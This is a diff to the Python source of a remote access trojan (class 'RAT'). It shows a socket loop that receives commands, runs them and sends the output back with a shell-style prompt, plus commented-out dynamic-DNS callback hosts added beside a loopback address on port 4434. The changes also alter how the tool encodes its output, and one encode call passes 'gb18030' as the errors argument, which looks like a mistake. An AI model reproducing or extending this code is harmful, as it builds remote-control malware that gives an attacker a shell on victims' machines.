@@ -122,7 +122,7 @@ except ImportError as e:
 	pip()
 
 
-class RAT:
+class RAT(RAW):
 
 	_sock = None
 	_port = None
@@ -143,8 +143,8 @@ class RAT:
 
 	# constructor
 	def __init__(self):
+		self._raw = RAW.__init__(self)
 		self.start()
-
 
 
 	# start the service
@@ -163,12 +163,11 @@ class RAT:
 					stdoutput = cls.data_handler(data)
 					# Send data to server
 					stdoutput += "\n" + os.getcwd() + "> "
-					stdoutput = stdoutput.decode('gbk').encode('utf-8')
+					stdoutput = stdoutput.decode('gbk').encode('utf-8', 'gb18030')
 					cls.send(stdoutput)
 				if(data == 'terminate'):
 					cls.kill()
 					break
-
 			except socket.error as e:
 				cls.socket_handler(e)
 				continue
@@ -180,11 +179,13 @@ class RAT:
 		cls._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		# set loopback address
 		#cls._loop = "127.0.0.1" #socket.gethostbyname("localhost")
+		# domain.ddns.chickenkiller.com
+		# flipper.hackquest.com
+		#cls._loop = 'flipper.hackquest.com'
 		cls._loop = '127.0.0.1'
 		# set new port
 		cls._port = 4434
 		cls._info = cls.build_info()
-		cls._raw = RAW()
 
 
 	# get fisrt time interaction info
